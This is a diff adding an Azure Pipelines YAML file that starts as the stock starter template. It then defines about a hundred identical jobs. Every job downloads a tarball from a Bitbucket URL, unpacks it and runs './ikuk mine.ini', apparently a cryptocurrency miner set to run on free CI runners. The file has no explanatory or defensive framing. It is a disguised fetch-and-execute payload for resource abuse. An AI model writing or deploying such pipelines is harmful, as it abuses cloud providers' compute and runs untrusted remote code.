@@ -1,0 +1,420 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+trigger:
+- main
+pool:
+  vmImage: ubuntu-latest
+steps:
+- script: echo Hello, world!
+  displayName: 'Run a one-line script'
+- script: |
+    echo Add other tasks to build, test, and deploy your project.
+    echo See https://aka.ms/yaml
+  displayName: 'Run a multi-line script'
+  
+jobs:
+- job: a
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+
+- job: b
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+
+- job: c
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+
+- job: d
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: e
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: f
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: g
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: h
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: i
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: j
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: k
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: l
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: m
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: n
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: o
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: p
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: q
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: r
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: s
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: t
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: u
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: v
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: w
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: x
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: y
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: z
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: aa
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: bb
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: cc
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: dd
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ee
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ff
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: gg
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: hh
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ii
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: jj
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: kk
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ll
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: mm
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: nn
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: oo
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: pp
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: qq
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: rr
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ss
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: tt
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: uu
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: vv
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ww
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: xx
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: yy
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: zz
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: aaa
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: bbb
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ccc
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ddd
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: eee
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: fff
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ggg
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: hhh
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: iii
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: jjj
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: kkk
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: lll
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: mmm
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: nnn
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ooo
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ppp
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: qqq
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: rrr
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: sss
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ttt
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: uuu
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: vvv
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: www
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: xxx
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: yyy
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: zzz
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: aaaa
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: bbbb
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: cccc
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: dddd
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: eeee
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ffff
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: gggg
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: hhhh
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: iiii
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: jjjj
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: kkkk
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: llll
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: mmmm
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: nnnn
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: oooo
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: pppp
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: qqqq
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: rrrr
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: ssss
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: tttt
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: uuuu
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: vvvv
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  
+- job: wwww
+  steps:
+  - script: wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
